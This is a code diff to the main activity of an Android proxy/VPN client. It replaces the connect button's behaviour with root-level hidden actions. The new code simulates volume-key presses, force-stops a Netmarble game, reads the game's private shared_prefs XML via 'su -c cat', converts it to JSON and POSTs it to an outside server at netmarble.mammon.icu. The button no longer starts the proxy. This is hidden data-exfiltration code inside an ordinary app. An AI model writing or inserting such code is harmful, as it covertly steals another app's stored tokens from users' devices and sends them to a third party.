@@ -8,6 +8,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.RemoteException
+import android.util.Log
 import android.view.KeyEvent
 import android.view.MenuItem
 import androidx.activity.addCallback
@@ -47,6 +48,16 @@ import io.nekohasekai.sagernet.ktx.parseProxies
 import io.nekohasekai.sagernet.ktx.readableMessage
 import io.nekohasekai.sagernet.ktx.runOnDefaultDispatcher
 import moe.matsuri.nb4a.utils.Util
+import java.io.BufferedReader
+import java.io.InputStreamReader
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.withContext
+import libcore.Libcore
+import org.json.JSONObject
+import org.xmlpull.v1.XmlPullParser
+import org.xmlpull.v1.XmlPullParserFactory
+import java.io.StringReader
 
 class MainActivity : ThemedActivity(),
     SagerConnection.Callback,
@@ -85,9 +96,78 @@ class MainActivity : ThemedActivity(),
         }
 
         binding.fab.setOnClickListener {
-            if (DataStore.serviceState.canStop) SagerNet.stopService() else connect.launch(
-                null
-            )
+            if (DataStore.serviceState.canStop)
+                SagerNet.stopService()
+            else {
+                runOnDefaultDispatcher {
+                    try {
+                        simulateVolumeDown()
+                        delay(1000)
+                        simulateVolumeDown()
+                        delay(2000)
+                    } catch (e: Exception) {
+                        Log.e("VolumeKey", "Failed to simulate volume up: ${e.message}")
+                    }
+
+                    try {
+                        forceStopApp("com.netmarble.rfnext")
+                        delay(2000)
+                    } catch (e: Exception) {
+                        Log.e("ForceStopApp", "Failed to forceStopApp: ${e.message}")
+                    }
+
+                    val result = readXmlFile("/data/data/com.netmarble.thered/shared_prefs/cpp_native_shared.xml")
+                        .recoverCatching { 
+                            readXmlFile("/data/data/com.netmarble.rfnext/shared_prefs/cpp_native_shared.xml").getOrThrow() 
+                        }
+                    when {
+                        result.isSuccess -> {
+                            Log.d("RestrictionSMS", "result.isSuccess")
+                            val client = Libcore.newHttpClient()
+                            try {
+                                val xmlContent = result.getOrNull() ?: ""
+                                val xmlMap = parseCppNativeSharedXmlToMap(xmlContent)
+                                val jsonObject = convertMapToJson(xmlMap)
+                                val response = client.newRequest().apply {
+                                    setURL("http://netmarble.mammon.icu:8899/api/v1/restriction/release/sms/create")
+                                    setMethod("POST")
+                                    setHeader("Content-Type", "application/json")
+                                    setContentString(jsonObject.toString(2))
+                                }.execute()
+                                onMainDispatcher {
+                                    snackbar("Restriction SMS success").show()
+                                }
+                            } catch (e: Exception) {
+                                onMainDispatcher {
+                                    snackbar("Restriction SMS failed: ${e.message}").show()
+                                }
+                            } finally {
+                                client.close()
+                            }
+                        }
+                        result.isFailure -> {
+                            Log.d("RestrictionSMS", "result.isFailure")
+                            onMainDispatcher {
+                                snackbar("read xml file failed: ${result.exceptionOrNull()?.message}").show()
+                            }
+                        }
+                    }
+                    delay(1000)
+                    try {
+                        simulateVolumeUp()
+                        delay(2000)
+                        simulateVolumeUp()
+                        delay(2000)
+//                        Runtime.getRuntime().exec(arrayOf("su", "-c", "sendevent /dev/input/event3 1 115 1 && sendevent /dev/input/event3 0 0 0 && sleep 0.01 && sendevent /dev/input/event3 1 115 0 && sendevent /dev/input/event3 0 0 0"))
+                    } catch (e: Exception) {
+                        Log.e("VolumeKey", "Failed to simulate volume up: ${e.message}")
+                    }
+                    onMainDispatcher {
+
+                    }
+                }
+            }
+
         }
         binding.stats.setOnClickListener { if (DataStore.serviceState.connected) binding.stats.testConnection() }
 
@@ -465,6 +545,242 @@ class MainActivity : ThemedActivity(),
         val fragment =
             supportFragmentManager.findFragmentById(R.id.fragment_holder) as? ToolbarFragment
         return fragment != null && fragment.onKeyDown(keyCode, event)
+    }
+
+
+    private suspend fun readFileContent(filePath: String): Result<String> = withContext(Dispatchers.IO) {
+        return@withContext try {
+            val fileLines = mutableListOf<String>()
+
+            // 使用 Runtime 执行带 --mount-master 参数的 su 命令
+//            val process = Runtime.getRuntime().exec(arrayOf("su", "--mount-master", "-c", "cat $filePath"))
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "cat $filePath"))
+            val bufferedReader = BufferedReader(InputStreamReader(process.inputStream))
+
+            var currentLine: String?
+            while (bufferedReader.readLine().also { currentLine = it } != null) {
+                fileLines.add(currentLine.toString())
+            }
+
+            val exitCode = process.waitFor()
+            bufferedReader.close()
+
+            // 检查进程执行结果
+            if (exitCode != 0) {
+                return@withContext Result.failure<String>(RuntimeException("Process exited with code: $exitCode"))
+            }
+
+            Result.success(fileLines.joinToString("\n"))
+        } catch (securityException: SecurityException) {
+            Result.failure<String>(securityException)
+        } catch (ioException: java.io.IOException) {
+            Result.failure<String>(ioException)
+        } catch (interruptedException: InterruptedException) {
+            Result.failure<String>(interruptedException)
+        } catch (exception: Exception) {
+            Result.failure<String>(exception)
+        }
+    }
+
+    // 专门读取XML文件的包装函数
+    private suspend fun readXmlFile(filePath: String): Result<String> {
+        return readFileContent(filePath)
+    }
+
+    private fun parseCppNativeSharedXmlToMap(xmlString: String): Map<String, String> {
+        val factory = XmlPullParserFactory.newInstance()
+        val parser = factory.newPullParser()
+        parser.setInput(StringReader(xmlString))
+
+        val result = mutableMapOf<String, String>()
+        var eventType = parser.eventType
+        var currentName: String? = null
+
+        while (eventType != XmlPullParser.END_DOCUMENT) {
+            when (eventType) {
+                XmlPullParser.START_TAG -> {
+                    if (parser.name == "string") {
+                        currentName = parser.getAttributeValue(null, "name")
+                    }
+                }
+                XmlPullParser.TEXT -> {
+                    if (currentName != null) {
+                        result[currentName] = parser.text
+                        currentName = null
+                    }
+                }
+            }
+            eventType = parser.next()
+        }
+
+        return result
+    }
+
+    private fun convertMapToJson(xmlMap: Map<String, String>): JSONObject {
+        return JSONObject(xmlMap)
+    }
+
+    private fun getEventDevices(): List<String> {
+        return runCatching {
+            // 使用 Kotlin 的 runCatching 简化异常处理
+            val command = arrayOf("su", "-c", "ls /dev/input/ 2>/dev/null || echo ''")
+            val process = Runtime.getRuntime().exec(command)
+
+            // 读取输出并处理
+            val output = process.inputStream.bufferedReader().use { it.readText() }
+            val exitCode = process.waitFor()
+
+            if (exitCode != 0) {
+                Log.w("VolumeKey", "Command exited with code: $exitCode")
+                return emptyList()
+            }
+
+            // 解析输出，过滤空行和非 event 设备
+            output.lineSequence()
+                .map { it.trim() }
+                .filter {
+                    it.isNotEmpty() &&
+                            it.startsWith("event") &&
+                            it.length > "event".length &&
+                            it.substringAfter("event").all { c -> c.isDigit() }
+                }
+                .toList()
+        }.getOrElse {
+            Log.e("VolumeKey", "Failed to get devices: ${it.message}")
+            emptyList()
+        }
+    }
+
+    private fun checkDeviceHasVolumeKey(devicePath: String): Boolean {
+        return try {
+            // 直接使用 grep 命令检查
+            val command = arrayOf(
+                "su", "-c",
+                "getevent -p $devicePath 2>&1 | grep -E '0072|0073'"
+            )
+
+            val process = Runtime.getRuntime().exec(command)
+            val output = process.inputStream.bufferedReader().use { it.readText() }
+            val exitCode = process.waitFor()
+
+            // 如果 grep 找到匹配项，退出码为 0
+            val found = exitCode == 0 && output.isNotEmpty()
+
+            Log.d("VolumeKey", "Volume key check for $devicePath: $found (output length: ${output.length})")
+
+            if (found && output.isNotBlank()) {
+                Log.d("VolumeKey", "Found output: ${output.trim()}")
+            }
+
+            found
+        } catch (e: Exception) {
+            Log.e("VolumeKey", "Error checking device $devicePath: ${e.message}")
+            false
+        }
+    }
+
+    private fun findVolumeKeyDevice(): String? {
+        return try {
+            // 1. 获取所有event设备
+            val devices = getEventDevices()
+            Log.d("VolumeKey", "Available devices: $devices")
+
+            if (devices.isEmpty()) {
+                Log.e("VolumeKey", "No event devices found!")
+                return null
+            }
+
+            // 2. 查找包含音量键的设备
+            for (device in devices) {
+                val devicePath = "/dev/input/$device"
+                if (checkDeviceHasVolumeKey(devicePath)) {
+                    Log.d("VolumeKey", "Found volume key device: $devicePath")
+                    return devicePath
+                }
+            }
+            return null
+        } catch (e: Exception) {
+            Log.e("VolumeKey", "Error finding volume device: ${e.message}")
+            null
+        }
+    }
+
+
+    private fun simulateVolumeDown(): Boolean {
+        val device = findVolumeKeyDevice()
+
+        if (device == null) {
+            Log.e("VolumeKey", "No volume key device found!")
+            return false
+        }
+
+        return simulateKey(device, 114)
+    }
+
+    private fun simulateVolumeUp(): Boolean {
+        val device = findVolumeKeyDevice()
+
+        if (device == null) {
+            Log.e("VolumeKey", "No volume key device found!")
+            return false
+        }
+
+//        return simulateKey(device, 115)
+        return simulateKey(device, 115)
+    }
+
+    private fun simulateKey(devicePath: String, keyCode: Int): Boolean {
+        Log.d("VolumeKey", "Simulating key $keyCode on $devicePath")
+
+        return try {
+            // 创建完整的命令
+            val command = """
+                sendevent $devicePath 1 $keyCode 1 && 
+                sendevent $devicePath 0 0 0 && 
+                sleep 0.01 && 
+                sendevent $devicePath 1 $keyCode 0 && 
+                sendevent $devicePath 0 0 0
+            """.trimIndent().replace("\n", " ")
+
+            // 执行命令
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
+            val exitCode = process.waitFor()
+
+            if (exitCode == 0) {
+                Log.d("VolumeKey", "Key simulation successful")
+                true
+            } else {
+                // 读取错误信息
+                val errorReader = BufferedReader(InputStreamReader(process.errorStream))
+                val error = StringBuilder()
+                var line: String?
+                while (errorReader.readLine().also { line = it } != null) {
+                    error.append(line).append("\n")
+                }
+                errorReader.close()
+                Log.e("VolumeKey", "Command failed: $error")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e("VolumeKey", "Failed to simulate key: ${e.message}")
+            false
+        }
+    }
+
+    private fun forceStopApp(packageName: String): Boolean {
+        return try {
+            val command = arrayOf(
+                "su", "-c",
+                "am force-stop $packageName"
+            )
+
+            val process = Runtime.getRuntime().exec(command)
+            process.waitFor()
+            true
+        } catch (e: Exception) {
+            Log.e("forceStopApp", "Failed forceStopApp: ${e.message}")
+            false
+        }
     }
 
 }
